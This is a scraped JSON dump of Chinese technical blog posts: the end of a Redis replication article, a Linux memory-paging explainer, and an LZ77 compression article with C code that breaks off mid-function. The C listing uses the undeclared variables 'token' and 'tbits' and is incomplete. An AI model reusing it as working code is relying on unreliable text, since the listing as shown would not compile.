client-output-buffer-limit slave 256MB 64MB 60：与全量复制阶段主节点的缓冲区大小有关，见前面的介绍。,\n,4)   repl-disable-tcp-nodelay no：与命令传播阶段的延迟有关，见前面的介绍。,\n,5)   masterauth <master-password>：与连接建立阶段的身份验证有关，见前面的介绍。,\n,6)   repl-ping-slave-period 10：与命令传播阶段主从节点的超时判断有关，见前面的介绍。,\n,7)   repl-backlog-size 1mb：复制积压缓冲区的大小，见前面的介绍。,\n,8)   repl-backlog-ttl 3600：当主节点没有从节点时，复制积压缓冲区保留的时间，这样当断开的从节点重新连进来时，可以进行全量复制；默认3600s。如果设置为0，则永远不会释放复制积压缓冲区。,\n,9)   min-slaves-to-write 3与min-slaves-max-lag 10：规定了主节点的最小从节点数目，及对应的最大延迟，见前面的介绍。,\n,（3）从节点相关配置,\n,1)   slave-serve-stale-data yes：与从节点数据陈旧时是否响应客户端命令有关，见前面的介绍。,\n,2)   slave-read-only yes：从节点是否只读；默认是只读的。由于从节点开启写操作容易导致主从节点的数据不一致，因此该配置尽量不要修改。,\n,6. 单机内存大小限制,\n,在 ,深入学习Redis（2）：持久化, 一文中，讲到了fork操作对Redis单机内存大小的限制。实际上在Redis的使用中，限制单机内存大小的因素非常之多，下面总结一下在主从复制中，单机内存过大可能造成的影响：,\n,（1）切主：当主节点宕机时，一种常见的容灾策略是将其中一个从节点提升为主节点，并将其他从节点挂载到新的主节点上，此时这些从节点只能进行全量复制；如果Redis单机内存达到10GB，一个从节点的同步时间在几分钟的级别；如果从节点较多，恢复的速度会更慢。如果系统的读负载很高，而这段时间从节点无法提供服务，会对系统造成很大的压力。,\n,（2）从库扩容：如果访问量突然增大，此时希望增加从节点分担读负载，如果数据量过大，从节点同步太慢，难以及时应对访问量的暴增。,\n,（3）缓冲区溢出：（1）和（2）都是从节点可以正常同步的情形（虽然慢），但是如果数据量过大，导致全量复制阶段主节点的复制缓冲区溢出，从而导致复制中断，则主从节点的数据同步会全量复制->复制缓冲区溢出导致复制中断->重连->全量复制->复制缓冲区溢出导致复制中断……的循环。,\n,（4）超时：如果数据量过大，全量复制阶段主节点fork+保存RDB文件耗时过大，从节点长时间接收不到数据触发超时，主从节点的数据同步同样可能陷入全量复制->超时导致复制中断->重连->全量复制->超时导致复制中断……的循环。,\n,此外，主节点单机内存除了绝对量不能太大，其占用主机内存的比例也不应过大：最好只使用50%-65%的内存，留下30%-45%的内存用于执行bgsave命令和创建复制缓冲区等。,\n,7. info Replication,\n,在Redis客户端通过info Replication可以查看与复制相关的状态，对于了解主从节点的当前状态，以及解决出现的问题都会有帮助。,\n,主节点：,\n,\n,从节点：,\n,\n,对于从节点，上半部分展示的是其作为从节点的状态，从connectd_slaves开始，展示的是其作为潜在的主节点的状态。,\n,info Replication中展示的大部分内容在文章中都已经讲述，这里不再详述。,\n,七、总结,\n,下面回顾一下本文的主要内容：,\n,1、主从复制的作用：宏观的了解主从复制是为了解决什么样的问题，即数据冗余、故障恢复、读负载均衡等。,\n,2、主从复制的操作：即slaveof命令。,\n,3、主从复制的原理：主从复制包括了连接建立阶段、数据同步阶段、命令传播阶段；其中数据同步阶段，有全量复制和部分复制两种数据同步方式；命令传播阶段，主从节点之间有PING和REPLCONF ACK命令互相进行心跳检测。,\n,4、应用中的问题：包括读写分离的问题（数据不一致问题、数据过期问题、故障切换问题等）、复制超时问题、复制中断问题等，然后总结了主从复制相关的配置，其中repl-timeout、client-output-buffer-limit slave等对解决Redis主从复制中出现的问题可能会有帮助。,\n,主从复制虽然解决或缓解了数据冗余、故障恢复、读负载均衡等问题，但其缺陷仍很明显：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制；这些问题的解决，需要哨兵和集群的帮助，我将在后面的文章中介绍，欢迎关注。,\n,参考文献,\n,《Redis开发与运维》,\n,《Redis设计与实现》,\n,《Redis实战》,\n,redis主从复制（1）— 慢查询导致复制中断,\n,\n,Top Redis Headaches for Devops – Replication Buffer,\n,\n,redis主从复制（2）— replication buffer与replication backlog,\n,\n,https://github.com/antirez/redis/issues/918,\n,https://blog.csdn.net/qbw2010/article/details/50496982,\n,https://mp.weixin.qq.com/s?__biz=MzIxMzEzMjM5NQ==&mid=2651029484&idx=1&sn=5882f4c7c390a0a0e4f6dfd872e203b5&chksm=8c4caae8bb3b23fe77909e307d45a071186f55069e5207602c61383eab573885615c1d835904&mpshare=1&scene=1&srcid=0327SokqtxEY3WojWNDMHLYl#rd,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114194/", "url_object_id": "aa95d1c9ae4721218650bfa651e5af8c", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "Linux 的内存分页管理", "create_time": "2018/07/24", "vote": "1", "bookmark": "4", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Vamei,   ,内存是计算机的主存储器。内存为进程开辟出进程空间，让进程在其中保存数据。我将从内存的物理特性出发，深入到内存管理的细节，特别是了解虚拟内存和内存分页的概念。,\n,内存,\n,简单地说，内存就是一个数据货架。内存有一个最小的存储单位，大多数都是一个字节。内存用内存地址（memory address）来为每个字节的数据顺序编号。因此，内存地址说明了数据在内存中的位置。内存地址从0开始，每次增加1。这种线性增加的存储器地址称为线性地址（linear address）。为了方便，我们用十六进制数来表示内存地址，比如0x00000003、0x1A010CB0。这里的“0x”用来表示十六进制。“0x”后面跟着的，就是作为内存地址的十六进制数。,\n,内存地址的编号有上限。地址空间的范围和地址总线（address bus）的位数直接相关。CPU通过地址总线来向内存说明想要存取数据的地址。以英特尔32位的80386型CPU为例，这款CPU有32个针脚可以传输地址信息。每个针脚对应了一位。如果针脚上是高电压，那么这一位是1。如果是低电压，那么这一位是0。32位的电压高低信息通过地址总线传到内存的32个针脚，内存就能把电压高低信息转换成32位的二进制数，从而知道CPU想要的是哪个位置的数据。用十六进制表示，32位地址空间就是从0x00000000 到0xFFFFFFFF。,\n,内存的存储单元采用了随机读取存储器（RAM， Random Access Memory）。所谓的“随机读取”，是指存储器的读取时间和数据所在位置无关。与之相对，很多存储器的读取时间和数据所在位置有关。就拿磁带来说，我们想听其中的一首歌，必须转动带子。如果那首歌是第一首，那么立即就可以播放。如果那首歌恰巧是最后一首，我们快进到可以播放的位置就需要花很长时间。我们已经知道，进程需要调用内存中不同位置的数据。如果数据读取时间和位置相关的话，计算机就很难把控进程的运行时间。因此，随机读取的特性是内存成为主存储器的关键因素。,\n,内存提供的存储空间，除了能满足内核的运行需求，还通常能支持运行中的进程。即使进程所需空间超过内存空间，内存空间也可以通过少量拓展来弥补。换句话说，内存的存储能力，和计算机运行状态的数据总量相当。内存的缺点是不能持久地保存数据。一旦断电，内存中的数据就会消失。因此，计算机即使有了内存这样一个主存储器，还是需要硬盘这样的外部存储器来提供持久的储存空间。,\n,虚拟内存,\n,内存的一项主要任务，就是存储进程的相关数据。我们之前已经看到过进程空间的程序段、全局数据、栈和堆，以及这些这些存储结构在进程运行中所起到的关键作用。有趣的是，尽管进程和内存的关系如此紧密，但进程并不能直接访问内存。在Linux下，进程不能直接读写内存中地址为0x1位置的数据。进程中能访问的地址，只能是虚拟内存地址（virtual memory address）。操作系统会把虚拟内存地址翻译成真实的内存地址。这种内存管理方式，称为虚拟内存（virtual memory）。,\n,每个进程都有自己的一套虚拟内存地址，用来给自己的进程空间编号。进程空间的数据同样以字节为单位，依次增加。从功能上说，虚拟内存地址和物理内存地址类似，都是为数据提供位置索引。进程的虚拟内存地址相互独立。因此，两个进程空间可以有相同的虚拟内存地址，如0x10001000。虚拟内存地址和物理内存地址又有一定的对应关系，如图1所示。对进程某个虚拟内存地址的操作，会被CPU翻译成对某个具体内存地址的操作。,\n,\n,图1 虚拟内存地址和物理内存地址的对应,\n,应用程序来说对物理内存地址一无所知。它只可能通过虚拟内存地址来进行数据读写。程序中表达的内存地址，也都是虚拟内存地址。进程对虚拟内存地址的操作，会被操作系统翻译成对某个物理内存地址的操作。由于翻译的过程由操作系统全权负责，所以应用程序可以在全过程中对物理内存地址一无所知。因此，C程序中表达的内存地址，都是虚拟内存地址。比如在C语言中，可以用下面指令来打印变量地址：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nint v = 0;\r\nprintf(\"%p\", (void*)&v);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,int, ,v, ,=, ,0,;,printf,(,\"%p\",,, ,(,void,*,),&,v,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,本质上说，虚拟内存地址剥夺了应用程序自由访问物理内存地址的权利。进程对物理内存的访问，必须经过操作系统的审查。因此，掌握着内存对应关系的操作系统，也掌握了应用程序访问内存的闸门。借助虚拟内存地址，操作系统可以保障进程空间的独立性。只要操作系统把两个进程的进程空间对应到不同的内存区域，就让两个进程空间成为“老死不相往来”的两个小王国。两个进程就不可能相互篡改对方的数据，进程出错的可能性就大为减少。,\n,另一方面，有了虚拟内存地址，内存共享也变得简单。操作系统可以把同一物理内存区域对应到多个进程空间。这样，不需要任何的数据复制，多个进程就可以看到相同的数据。内核和共享库的映射，就是通过这种方式进行的。每个进程空间中，最初一部分的虚拟内存地址，都对应到物理内存中预留给内核的空间。这样，所有的进程就可以共享同一套内核数据。共享库的情况也是类似。对于任何一个共享库，计算机只需要往物理内存中加载一次，就可以通过操纵对应关系，来让多个进程共同使用。IPO中的共享内存，也有赖于虚拟内存地址。,\n,内存分页,\n,虚拟内存地址和物理内存地址的分离，给进程带来便利性和安全性。但虚拟内存地址和物理内存地址的翻译，又会额外耗费计算机资源。在多任务的现代计算机中，虚拟内存地址已经成为必备的设计。那么，操作系统必须要考虑清楚，如何能高效地翻译虚拟内存地址。,\n,记录对应关系最简单的办法，就是把对应关系记录在一张表中。为了让翻译速度足够地快，这个表必须加载在内存中。不过，这种记录方式惊人地浪费。如果树莓派1GB物理内存的每个字节都有一个对应记录的话，那么光是对应关系就要远远超过内存的空间。由于对应关系的条目众多，搜索到一个对应关系所需的时间也很长。这样的话，会让树莓派陷入瘫痪。,\n,因此，Linux采用了分页（paging）的方式来记录对应关系。所谓的分页，就是以更大尺寸的单位页（page）来管理内存。在Linux中，通常每页大小为4KB。如果想要获取当前树莓派的内存页大小，可以使用命令：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$getconf PAGE_SIZE,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$,getconf ,PAGE_SIZE,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,得到结果，即内存分页的字节数：,\n,4096,\n,返回的4096代表每个内存页可以存放4096个字节，即4KB。Linux把物理内存和进程空间都分割成页。,\n,内存分页，可以极大地减少所要记录的内存对应关系。我们已经看到，以字节为单位的对应记录实在太多。如果把物理内存和进程空间的地址都分成页，内核只需要记录页的对应关系，相关的工作量就会大为减少。由于每页的大小是每个字节的4000倍。因此，内存中的总页数只是总字节数的四千分之一。对应关系也缩减为原始策略的四千分之一。分页让虚拟内存地址的设计有了实现的可能。,\n,无论是虚拟页，还是物理页，一页之内的地址都是连续的。这样的话，一个虚拟页和一个物理页对应起来，页内的数据就可以按顺序一一对应。这意味着，虚拟内存地址和物理内存地址的末尾部分应该完全相同。大多数情况下，每一页有4096个字节。由于4096是2的12次方，所以地址最后12位的对应关系天然成立。我们把地址的这一部分称为偏移量（offset）。偏移量实际上表达了该字节在页内的位置。地址的前一部分则是页编号。操作系统只需要记录页编号的对应关系。,\n,\n图2 地址翻译过程,\n,多级分页表,\n,内存分页制度的关键，在于管理进程空间页和物理页的对应关系。操作系统把对应关系记录在分页表（page table）中。这种对应关系让上层的抽象内存和下层的物理内存分离，从而让Linux能灵活地进行内存管理。由于每个进程会有一套虚拟内存地址，那么每个进程都会有一个分页表。为了保证查询速度，分页表也会保存在内存中。分页表有很多种实现方式，最简单的一种分页表就是把所有的对应关系记录到同一个线性列表中，即如图2中的“对应关系”部分所示。,\n,这种单一的连续分页表，需要给每一个虚拟页预留一条记录的位置。但对于任何一个应用进程，其进程空间真正用到的地址都相当有限。我们还记得，进程空间会有栈和堆。进程空间为栈和堆的增长预留了地址，但栈和堆很少会占满进程空间。这意味着，如果使用连续分页表，很多条目都没有真正用到。因此，Linux中的分页表，采用了多层的数据结构。多层的分页表能够减少所需的空间。,\n,我们来看一个简化的分页设计，用以说明Linux的多层分页表。我们把地址分为了页编号和偏移量两部分，用单层的分页表记录页编号部分的对应关系。对于多层分页表来说，会进一步分割页编号为两个或更多的部分，然后用两层或更多层的分页表来记录其对应关系，如图3所示。,\n, 图3 多层分页表,\n,\n,在图3的例子中，页编号分成了两级。第一级对应了前8位页编号，用2个十六进制数字表示。第二级对应了后12位页编号，用3个十六进制编号。二级表记录有对应的物理页，即保存了真正的分页记录。二级表有很多张，每个二级表分页记录对应的虚拟地址前8位都相同。比如二级表0x00，里面记录的前8位都是0x00。翻译地址的过程要跨越两级。我们先取地址的前8位，在一级表中找到对应记录。该记录会告诉我们，目标二级表在内存中的位置。我们再在二级表中，通过虚拟地址的后12位，找到分页记录，从而最终找到物理地址。,\n,多层分页表就好像把完整的电话号码分成区号。我们把同一地区的电话号码以及对应的人名记录同通一个小本子上。再用一个上级本子记录区号和各个小本子的对应关系。如果某个区号没有使用，那么我们只需要在上级本子上把该区号标记为空。同样，一级分页表中0x01记录为空，说明了以0x01开头的虚拟地址段没有使用，相应的二级表就不需要存在。正是通过这一手段，多层分页表占据的空间要比单层分页表少了很多。,\n多层分页表还有另一个优势。单层分页表必须存在于连续的内存空间。而多层分页表的二级表，可以散步于内存的不同位置。这样的话，操作系统就可以利用零碎空间来存储分页表。还需要注意的是，这里简化了多层分页表的很多细节。最新Linux系统中的分页表多达3层，管理的内存地址也比本章介绍的长很多。不过，多层分页表的基本原理都是相同。,\n,综上，我们了解了内存以页为单位的管理方式。在分页的基础上，虚拟内存和物理内存实现了分离，从而让内核深度参与和监督内存分配。应用进程的安全性和稳定性因此大为提高。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 4 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114225/", "url_object_id": "341703d9c514b0daa1ffc80fbe447cf0", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/95f95341b03e66babaadc935b51d6a24.jpg"], "title": "数据压缩算法：LZ77 算法的分析与实现", "create_time": "2018/07/17", "vote": "1", "bookmark": "2", "comments": "2", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,IDreamo,   ,LZ77简介,\n,Ziv和Lempel于1977年发表题为“顺序数据压缩的一个通用算法（A Universal Algorithm for Sequential Data Compression ）”的论文，论文中描述的算法被后人称为LZ77算法。值得说的是，LZ77严格意义上来说不是一种算法，而是一种编码理论。同Huffman编码一样，只定义了原理，并没有定义如何实现。,基于这种理论来实现的算法才称为LZ77算法，或者人们更愿意称为LZ77变种。,实际上这类算法已经有很多了，比如LZSS、LZB、LZH等。至今，几乎我们日常使用的所有通用压缩工具，象ARJ，PKZip，WinZip，LHArc，RAR，GZip，ACE，ZOO，TurboZip，Compress，JAR„„甚至许多硬件如网络设备中内置的压缩算法，无一例外，都可以最终归结为这两个以色列人的杰出贡献。,\n,LZ77是一种基于字典的算法，它将长字符串（也称为短语）编码成短小的标记，用小标记代替字典中的短语，从而达到压缩的目的。也就是说，它通过用小的标记来代替数据中多次重复出现的长串方法来压缩数据。其处理的符号不一定是文本字符，可以是任意大小的符号。,\n,短语字典的维护,\n,不同的基于字典的算法使用不同的方法来维护它们的字典。,LZ77使用的是一个前向缓冲区和一个滑动窗口,。,\n,LZ77首先将一部分数据载入前向缓冲区,。为了便于理解前向缓冲区如何存储短语并形成字典，我们将缓冲区描绘成S,1,，…，S,n,的字符序列，P,b,是由字符组成的短语集合。从字符序列S,1,，…，S,n,，组成n个短语，定义如下：,\n,P,b, = {(S,1,),(S,1,,S,2,),…,(S,1,,…,S,n,)},\n,例如，如果前向缓冲区包含字符(A,B,D)，那么缓冲区中的短语为{(A),(A,B),(A,B,D)}。,\n,一旦数据中的短语通过前向缓冲区，那么它将移动到滑动窗口中，并变成字典的一部分。,为理解短语是如何在滑动窗口中表示的，首先，把窗口想象成S,1,，…，S,m,的字符序列，且P,w,是由这些字符组成的短语集合。从序列S,1,，…，S,m,产生短语数据集合的过程如下：,\n,P,w, = {P,1,,P,2,,…,P,m,}，其中P,i, = {(S,i,),(S,i,,S,i,+1),…,(S,i,,S,i,+1,…,S,m,)},\n,例如，如果滑动窗口中包含符号(A,B,C)，那么窗口和字典中的短语为{(A),(A,B),(A,B,C),(B),(B,C),(C)}。,\n,LZ77算法的主要思想就是在前向缓冲区中不断寻找能够与字典中短语匹配的最长短语。,以上面描述的前向缓冲区和滑动窗口为例，其最长的匹配短语为(A,B)。,\n,压缩和解压缩数据,\n,前向缓冲区和滑动窗口之间的匹配有两种情况：要么找到一个匹配短语，要么找不到匹配的短语。当找到最长的匹配时，将其编码成短语标记。,\n,短语标记包含三个部分：1、滑动窗口中的偏移量（从头部到匹配开始的前一个字符）；2、匹配中的符号个数；3、匹配结束后，前向缓冲区中的第一个符号。,\n,当没有找到匹配时，将未匹配的符号编码成符号标记。这个符号标记仅仅包含符号本身，没有压缩过程。事实上，我们将看到符号标记实际上比符号多一位，所以会出现轻微的扩展。,\n,一旦把n个符号编码并生成相应的标记，就将这n个符号从滑动窗口的一端移出，并用前向缓冲区中同样数量的符号来代替它们。然后，重新填充前向缓冲区。这个过程使滑动窗口中始终有最新的短语。滑动窗口和前向缓冲区具体维护的短语数量由它们自身的容量决定。,\n,下图（1）展示了用LZ77算法压缩字符串的过程，其中滑动窗口大小为8个字节，前向缓冲区大小为4个字节。在实际中，滑动窗口典型的大小为4KB（4096字节）。前向缓冲区大小通常小于100字节。,\n,\n,图（1）：使用LZ77算法对字符串ABABCBABABCAD进行压缩,\n,我们通过解码标记和保持滑动窗口中符号的更新来解压缩数据，其过程类似于压缩过程。,当解码每个标记时，将标记编码成字符拷贝到滑动窗口中。每当遇到一个短语标记时，就在滑动窗口中查找相应的偏移量，同时查找在那里发现的指定长度的短语。每当遇到一个符号标记时，就生成标记中保存的一个符号。,下图（2）展示了解压缩图（1）中数据的过程。,\n,\n,图（2）：使用LZ77算法对图（1）中压缩的字符串进行解压缩,\n,LZ77的效率,\n,用LZ77算法压缩的程度取决于很多因素，例如，选择滑动窗口的大小，为前向缓冲区设置的大小，以及数据本身的熵。最终，压缩的程度取决于能匹配的短语的数量和短语的长度。大多数情况下，LZ77比霍夫曼编码有着更高的压缩比，但是其压缩过程相对较慢。,\n,用LZ77算法压缩数据是非常耗时的，国为要花很多时间寻找窗口中的匹配短语。然而在通常情况下，LZ77的解压缩过程要比霍夫曼编码的解压缩过程耗时要少。LZ77的解压缩过程非常快是因为每个标记都明确地告诉我们在缓冲区中哪个位置可以读取到所需要的符号。事实上，我们最终只从滑动窗口中读取了与原始数据数量相等的符号而已。,\n,LZ77的接口定义,\n,lz77_compress,\n,\n,int lz77_compress(const unsigned char *original, unsigned char **compressed, int size);,\n,返回值：如果数据压缩成功，返回压缩后数据的字节数；否则返回-1；,\n,描述：   用LZ77算法压缩缓冲区original中的数据，original包含size个字节的空间。压缩后的数据存入缓冲区compressed中。lz77_compress需要调用malloc来动态的为compressed分配存储空间，当这块空间不再使用时，由调用者调用函数free来释放空间。,\n,复杂度：O(n)，其中n是原始数据中符号的个数。,\n,lz77_uncompress,\n,\n,int lz77_uncompress(const unsigned char *compressed, unsigned char **original);,\n,返回值：如果解压缩数据成功，返回恢复后数据的字节数；否则返回-1；,\n,描述：   用LZ77算法解压缩缓冲区compressed中的数据。假定缓冲区包含的数据之前由lz77_compress压缩。恢复后的数据存入缓冲区original中。lz77_uncompress函数调用malloc来动态的为original分配存储空间。当这块存储空间不再使用时，由调用者调用函数free来释放空间。,\n,复杂度：O（n）其中n是原始数据中符号的个数。,\n,LZ77的实现与分析,\n,LZ77算法，通过一个滑动窗口将前向缓冲区中的短语编码成相应的标记，从而达到压缩的目的。在解压缩的过程中，将每个标记解码成短语或符号本身。要做到这些，必须要不断地更新窗口，这样，在压缩过程中的任何时刻，窗口都能按照规则进行编码。在本节所有的示例中，原始数据中的一个符号占一个字节。,\n,lz77_compress,\n,lz77_compress操作使用LZ77算法来压缩数据。,首先，它将数据中的符号写入压缩数据的缓冲区中，并同时初始化滑动窗口和前向缓冲区。随后，前向缓冲区将用来加载符号。,\n,压缩发生在一个循环中，循环会持续迭代直到处理完所有符号。使用ipos来保存原始数据中正在处理的当前字节，并用opos来保存向压缩数据缓冲区写入的当前位。在循环的每次迭代中，调用compare_win来确定前向缓冲区与滑动窗口中匹配的最长短语。函数compare_win返回最长匹配串的长度。,\n,当找到一个匹配串时，compare_win设置offset为滑动窗口中匹配串的位置，同时设置next为前向缓冲区中匹配串后一位的符号。在这种情况下，向压缩数据中写入一个短语标记（如图3-a）。在本节展示的实现中，对于偏移量offset短语标记需要12位，这是因为滑动窗口的大小为4KB（4096字节）。此时短语标志需要5位来表示长度，因为在一个32字节的前向缓冲区中，不会有匹配串超过这个长度。当没有找到匹配串时，compare_win返回，并且设置next为前向缓冲区起始处未匹配的符号。在这种情况下，向压缩数据中写入一个符号（如图3-b）。无论向压缩数据中写入的是一个短语还是一个符号，在实际写入标记之前，都需要调用网络函数htonl来转换串，以保证标记是大端格式。这种格式是在实际压缩数据和解压缩数据时所要求的。,\n,\n,图3：LZ77中的短语标记（A）和符号标记（B）的结构,\n,一旦将相应的标记写入压缩数据的缓冲区中，就调整滑动窗口和前向缓冲区。要使数据通过滑动窗口，将数据从右边滑入窗口，从左边滑出窗口。同样，在前向缓冲区中也是相同的滑动过程。移动的字节数与标记中编码的字符数相等。,\n,lz77_compress的时间复杂度为O(n)，其中n是原始数据中符号的个数。这是因为，对于数据中每个n/c个编码的标记，其中1/c是一个代表编码效率的常量因素，调用一次compare_win。函数compare_win运行一段固定的时间，因为滑动窗口和前向缓冲区的大小均为常数。然而，这些常量比较大，会对lz77_compress的总体运行时间产生较大的影响。所以，lz77_compress的时间复杂度是O(n)，但其实际的复杂度会受其常量因子的影响。这就解释了为什么在用lz77进行数据压缩时速度非常慢。,\n,lz77_uncompress,\n,lz77_uncompress操作解压缩由lz77_compress压缩的数据。,首先，该函数从压缩数据中读取字符，并初始化滑动窗口和前向缓冲区。,\n,解压缩过程在一个循环中执行，此循环会持续迭代执行直到所有的符号处理完。使用ipos来保存向压缩数据中写入的当前位，并用opos来保存写入恢复数据缓冲区中当前字节。在循环的每次迭代过程中，首先从压缩数据读取一位来确定要解码的标记类型。,\n,在解析一个标记时，如果读取的首位是1，说明遇到了一个短语标记。此时读取它的每个成员，查找滑动窗口中的短语，然后将短语写入恢复数据缓冲区中。当查找每个短语时，调用网络函数ntohl来保证窗口中的偏移量和长度的字节顺序是与操作系统匹配的。这个转换过程是必要的，因为从压缩数据中读取出来的偏移量和长度是大端格式的。在数据被拷贝到滑动窗口之前，前向缓冲区被用做一个临时转换区来保存数据。最后，写入该标记编码的匹配的符号。如果读取的标记的首位是0，说明遇到了一个符号标记。在这种情况下，将该标记编码的匹配符号写入恢复数据缓冲区中。,\n,一旦将解码的数据写入恢复数据的缓冲区中，就调整滑动窗口。要将数据通过滑动窗口，将数据从右边滑入窗口，从左边滑出窗口。移动的字节数与从标记中解码的字符数相等。,\n,lz77_uncompress的时间复杂度为O(n)，其中n是原始数据中符号的个数。,\n,示例：LZ77的实现文件 ,\n,(示例所需要的头文件信息请查阅前面的文章：,数据压缩的重要组成部分–位操作,),\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n/*lz77.c*/\r\n#include <netinet/in.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\n#include \"bit.h\"\r\n#include \"compress.h\"\r\n\r\n/*compare_win 确定前向缓冲区中与滑动窗口中匹配的最长短语*/\r\nstatic int compare_win(const unsigned char *window, const unsigned char *buffer,\r\n                       int *offset, unsigned char *next)\r\n{\r\n    int match,longest,i,j,k;\r\n\r\n    /*初始化偏移量*/\r\n    *offset = 0;\r\n\r\n    /*如果没有找到匹配，准备在前向缓冲区中返回0和下一个字符*/\r\n    longest = 0;\r\n    *next = buffer[0];\r\n\r\n    /*在前向缓冲区和滑动窗口中寻找最佳匹配*/\r\n    for(k=0; k<LZ77_WINDOW_SIZE; k++)\r\n    {\r\n        i = k;\r\n        j = 0;\r\n        match = 0;\r\n\r\n        /*确定滑动窗口中k个偏移量匹配的符号数*/\r\n        while(i<LZ77_WINDOW_SIZE && j<LZ77_BUFFER_SIZE - 1)\r\n        {\r\n            if(window[i] != buffer[j])\r\n                break;\r\n\r\n            match++;\r\n            i++;\r\n            j++;\r\n        }\r\n\r\n        /*跟踪最佳匹配的偏移、长度和下一个符号*/\r\n        if(match > longest)\r\n        {\r\n            *offset = k;\r\n            longest = match;\r\n            *next = buffer[j];\r\n        }\r\n    }\r\n    return longest;\r\n}\r\n\r\n/*lz77_compress  使用lz77算法压缩数据*/\r\nint lz77_compress(const unsigned char *original,unsigned char **compressed,int size)\r\n{\r\n    unsigned char     window[LZ77_WINDOW_SIZE],\r\n                      buffer[LZ77_BUFFER_SIZE],\r\n                      *comp,\r\n                      *temp,\r\n                      next;\r\n    int               offset,\r\n                      length,\r\n                      remaining,\r\n                      hsize,\r\n                      ipos,\r\n                      opos,\r\n                      tpos,\r\n                      i;\r\n    /*使指向压缩数据的指针暂时无效*/\r\n    *compressed = NULL;\r\n\r\n    /*写入头部信息*/\r\n    hsize = sizeof(int);\r\n    if((comp = (unsigned char *)malloc(hsize)) == NULL)\r\n        return -1;\r\n    memcpy(comp,&size,sizeof(int));\r\n\r\n    /*初始化滑动窗口和前向缓冲区(用0填充)*/\r\n    memset(window, 0 , LZ77_WINDOW_SIZE);\r\n    memset(buffer, 0 , LZ77_BUFFER_SIZE);\r\n\r\n    /*加载前向缓冲区*/\r\n    ipos = 0;\r\n\r\n    for(i=0; i<LZ77_BUFFER_SIZE && ipos < size; i++)\r\n    {\r\n        buffer[i] = original[ipos];\r\n        ipos++;\r\n    }\r\n\r\n    /*压缩数据*/\r\n    opos = hsize * 8;\r\n    remaining = size;\r\n\r\n    while(remaining > 0)\r\n    {\r\n        if((length = compare_win(window,buffer,&offset,&next)) != 0)\r\n        {\r\n            /*编码短语标记*/\r\n            token = 0x00000001 << (LZ77_PHRASE_BITS - 1);\r\n\r\n            /*设置在滑动窗口找到匹配的偏移量*/\r\n            token = token | (offset << (LZ77_PHRASE_BITS - LZ77_TYPE_BITS - LZ77_WINOFF_BITS));\r\n\r\n            /*设置匹配串的长度*/\r\n            token = token | (length << (LZ77_PHRASE_BITS - LZ77_TYPE_BITS - LZ77_WINOFF_BITS - LZ77_BUFLEN_BITS));\r\n\r\n            /*设置前向缓冲区中匹配串后面紧邻的字符*/\r\n            token = token | next;\r\n\r\n            /*设置标记的位数*/\r\n            tbits = LZ77_PHRASE_BITS;\r\n        }\r\n        else\r\n        {\r\n            /*编码一个字符标记*/\r\n            token = 0x00000000;\r\n\r\n            /*设置未匹配的字符*/\r\n            token = token | next;\r\n\r\n            /*设置标记的位数*/\r\n            tbits = LZ77_SYMBOL_BITS;\r\n        }\r\n\r\n        /*确定标记是大端格式*/\r\n        token = htonl(token);\r\n\r\n        /*将标记写入压缩缓冲区*/\r\n        for(i=0; i<tbits; i++)\r\n        {\r\n            if(opos % 8 == 0)\r\n            {\r\n                /*为压缩缓冲区分配临时空间*/\r\n                if((temp = (unsigned char *)realloc(comp,(opos / 8) + 1)) == NULL)\r\n                {\r\n                    free(comp);\r\n                    return -1;\r\n                }\r\n                comp = temp;\r\n            }\r\n\r\n            tpos = (sizeof(unsigned long ) * 8) - tbits + i;\r\n            bit_set(comp,opos,bit_get((unsigned char *)&token,tpos));\r\n            opos++;\r\n        }\r\n        /*调整短语长度*/\r\n        length++;\r\n\r\n        /*从前向缓冲区中拷贝数据到滑动窗口中*/\r\n        memmove(&window[0],&window[length],LZ77_WINDOW_SIZE - length);\r\n        memmove(&window[LZ77_WINDOW_SIZE - length],&buffer[0],length);\r\n        memmove(&buffer[0],&buffer[length],LZ77_BUFFER_SIZE - length);\r\n        /*向前向缓冲区中读取更多数据*/\r\n        for(i = LZ77_BUFFER_SIZE - length; i<LZ77_BUFFER_SIZE && ipos <size; i++)\r\n        {\r\n            buffer[i] = original[ipos];\r\n            ipos++;\r\n        }\r\n\r\n        /*调整剩余未匹配的长度*/\r\n        remaining = remaining - 